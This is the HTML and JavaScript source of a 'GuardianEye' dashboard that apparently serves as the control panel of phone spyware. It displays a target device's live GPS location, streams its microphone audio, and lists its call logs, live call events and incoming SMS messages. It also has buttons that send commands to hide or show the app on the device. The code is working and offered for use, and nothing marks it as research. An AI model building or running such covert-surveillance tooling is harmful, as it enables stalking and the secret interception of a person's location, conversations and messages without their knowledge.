<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GuardianEye Dashboard</title>
  <script src="/socket.io/socket.io.js"></script>

  <!-- Leaflet Map -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
      background: #f4f6f9;
    }
    h1, h2 {
      text-align: center;
    }
    #map {
      height: 600px;
      width: 100%;
      margin-top: 10px;
      border-radius: 12px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    #status {
      margin: 10px 0;
      padding: 10px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
    }
    button {
      display: inline-block;
      margin: 10px;
      padding: 10px 20px;
      background: #007bff;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #0056b3;
    }
    #audioStatus {
      text-align: center;
      margin-top: 5px;
      font-style: italic;
    }
    table {
      width: 100%;
      margin-top: 15px;
      border-collapse: collapse;
      background: #fff;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    th, td {
      border: 1px solid #ddd;
      padding: 8px;
      text-align: center;
    }
    th {
      background: #007bff;
      color: #fff;
    }
    tr:nth-child(even) {
      background: #f9f9f9;
    }
    .eventList {
      margin-top: 15px;
      padding: 10px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      max-height: 200px;
      overflow-y: auto;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .eventList div {
      margin-bottom: 5px;
      padding: 5px;
      border-bottom: 1px solid #eee;
    }
    .eventList div:last-child {
      border-bottom: none;
    }
    .control-buttons {
      text-align: center;
      margin: 20px 0;
    }
  </style>
</head>
<body>
  <h1>GuardianEye Dashboard</h1>

  <div id="status">ðŸ”´ Disconnected</div>

  <div class="control-buttons">
    <button id="hideApp">ðŸ‘» Hide App</button>
    <button id="showApp">ðŸ“² Show App</button>
  </div>

  <h2>Live Map</h2>
  <div id="map"></div>

  <h2>Live Audio</h2>
  <button id="startAudio">â–¶ Start Listening</button>
  <p id="audioStatus">Click the button to start audio.</p>

  <h2>ðŸ“‹ Call Logs</h2>
  <table id="callLogsTable">
    <thead>
      <tr>
        <th>Number</th>
        <th>Type</th>
        <th>Date</th>
        <th>Duration (s)</th>
      </tr>
    </thead>
    <tbody id="callLogsBody">
      <tr><td colspan="4">Waiting for call logs...</td></tr>
    </tbody>
  </table>

  <h2>ðŸ“ž Real-time Call Events</h2>
  <div id="callEventsList" class="eventList">
    <div>Waiting for call events...</div>
  </div>

  <h2>ðŸ“¨ Real-time SMS Messages</h2>
  <div id="smsList" class="eventList">
    <div>Waiting for SMS messages...</div>
  </div>

  <script>
    const socket = io();

    const statusDiv = document.getElementById("status");
    socket.on("connect", () => {
      statusDiv.innerText = "ðŸŸ¢ Connected to server";
      statusDiv.style.color = "green";

      socket.emit("listener-register");
      console.log("Listener registered");
    });

    socket.on("disconnect", () => {
      statusDiv.innerText = "ðŸ”´ Disconnected";
      statusDiv.style.color = "red";
    });

    // === CONTROL BUTTONS FOR HIDE/SHOW APP ===
    document.getElementById("hideApp").addEventListener("click", () => {
      socket.emit("hide-app-server");
      console.log("ðŸ‘» Hide App command sent to server");
    });

    document.getElementById("showApp").addEventListener("click", () => {
      socket.emit("show-app-server");
      console.log("ðŸ“² Show App command sent to server");
    });

    // === MAP ===
    const map = L.map('map').setView([20, 78], 5);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: 'Â© OpenStreetMap contributors'
    }).addTo(map);

    let marker;
    socket.on("location-update", (data) => {
      if (!data.lat || !data.lng) return;
      if (!marker) {
        marker = L.marker([data.lat, data.lng]).addTo(map);
      } else {
        marker.setLatLng([data.lat, data.lng]);
      }
      map.setView([data.lat, data.lng], 15);
    });

    // === AUDIO ===
    let audioContext = null;
    let audioQueue = [];
    let isPlaying = false;

    document.getElementById("startAudio").addEventListener("click", () => {
      if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        document.getElementById("audioStatus").innerText = "ðŸŽ§ Listening...";
        console.log("AudioContext started");
      }
      if (!isPlaying) playNextChunk();
    });

    function playNextChunk() {
      if (!audioQueue.length || !audioContext) {
        isPlaying = false;
        return;
      }
      const float32Array = audioQueue.shift();
      const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
      audioBuffer.copyToChannel(float32Array, 0);

      const bufferSource = audioContext.createBufferSource();
      bufferSource.buffer = audioBuffer;
      bufferSource.connect(audioContext.destination);
      bufferSource.onended = playNextChunk;
      bufferSource.start();
      isPlaying = true;
    }

    socket.on("audio-chunk", (base64Chunk) => {
      if (!audioContext) return;
      const byteString = atob(base64Chunk.replace(/\n/g,''));
      const buffer = new Uint8Array(byteString.length);
      for (let i = 0; i < byteString.length; i++) buffer[i] = byteString.charCodeAt(i);

      const float32Array = new Float32Array(buffer.length / 2);
      for (let i = 0; i < float32Array.length; i++) {
        let int16 = (buffer[i*2 +1] << 8) | buffer[i*2];
        if (int16 >= 32768) int16 -= 65536;
        float32Array[i] = int16 / 32768;
      }

      audioQueue.push(float32Array);
      if (!isPlaying) playNextChunk();
    });

    // === CALL LOGS ===
    socket.on("call-logs", (logs) => {
      const tbody = document.getElementById("callLogsBody");
      tbody.innerHTML = "";
      if (!logs || logs.length === 0) {
        tbody.innerHTML = "<tr><td colspan='4'>No call logs available</td></tr>";
        return;
      }
      logs.forEach(log => {
        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${log.number || "Unknown"}</td>
          <td>${log.type}</td>
          <td>${new Date(log.date).toLocaleString()}</td>
          <td>${log.duration}</td>
        `;
        tbody.appendChild(row);
      });
    });

    // === REAL-TIME CALL EVENTS ===
    const callEventsList = document.getElementById("callEventsList");
    socket.on("call-event", (event) => {
      const div = document.createElement("div");
      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
      callEventsList.prepend(div);
    });

    // === REAL-TIME SMS MESSAGES ===
    const smsList = document.getElementById("smsList");
    socket.on("sms-received", (sms) => {
      const div = document.createElement("div");
      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.number || "Unknown"}: ${sms.body}`;
      smsList.prepend(div);
    });

  </script>
</body>
</html>
